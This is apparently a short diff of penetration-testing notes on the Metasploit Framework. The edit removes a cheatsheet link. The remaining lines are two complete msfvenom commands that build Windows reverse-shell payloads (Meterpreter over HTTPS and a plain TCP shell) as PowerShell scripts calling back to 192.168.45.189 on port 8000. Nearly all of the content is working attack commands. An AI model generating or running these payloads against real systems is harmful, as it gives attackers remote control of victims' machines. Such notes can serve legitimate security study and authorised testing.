@@ -1,11 +1,8 @@
 The Metasploit Framework
 
-https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
-
 msfvenom -p windows/x64/meterpreter_reverse_https lhost=192.168.45.189 lport=8000 -f psh > shell.ps1
 
 msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.189 lport=8000 -f psh > shell.ps1
-
 
 Non-Meterpreter Binaries
 
